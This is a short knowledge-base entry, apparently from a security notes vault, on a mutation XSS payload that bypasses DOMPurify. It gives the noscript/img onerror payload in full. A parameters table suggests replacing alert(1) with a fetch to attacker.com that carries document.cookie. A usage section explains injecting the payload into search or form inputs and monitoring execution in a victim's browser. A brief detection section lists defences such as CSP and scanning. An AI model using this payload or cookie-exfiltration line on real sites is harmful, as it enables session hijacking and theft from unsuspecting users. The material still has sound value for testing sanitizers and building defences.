---
type: code
language: javascript
verified: true
tags:
  - xss
  - mutated-xss
  - dompurify-bypass
platforms:
  - Web
validated: true
---

# Mutated-XSS-Payload-for-DOMPurify-Bypass

## Code

```javascript
<noscript><p title="</noscript><img src=x onerror=alert(1)>
```

## Description

This payload exploits DOMPurify by using a noscript tag with a title attribute containing a closing quote to break out of sanitization context, injecting an img tag that executes JavaScript via onerror. Discovered by Masato Kinugawa, it targets flawed parsing in libraries like DOMPurify on sites such as Google Search.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `alert(1)` | Placeholder for malicious JavaScript (e.g., exfiltrate cookies) | `fetch('http://attacker.com?cookie='+document.cookie)` |

## Usage

Inject the payload into vulnerable inputs like search 'data' fields. Submit via form or URL parameter. Monitor for execution in the victim's browser session. Use in reflected/stored XSS scenarios to gain DOM access.

## Detection

- Scan sanitized outputs for unbalanced noscript or unexpected img tags with onerror.
- Enable CSP to block inline event handlers.
- Log client-side errors or anomalous network requests from img src failures.
- Use tools like OWASP ZAP to fuzz for similar bypasses.

## Related

- [[procedures/Mutated-XSS-with-HTML-Tag-Recreation-and-DOMPurify-Bypass]]
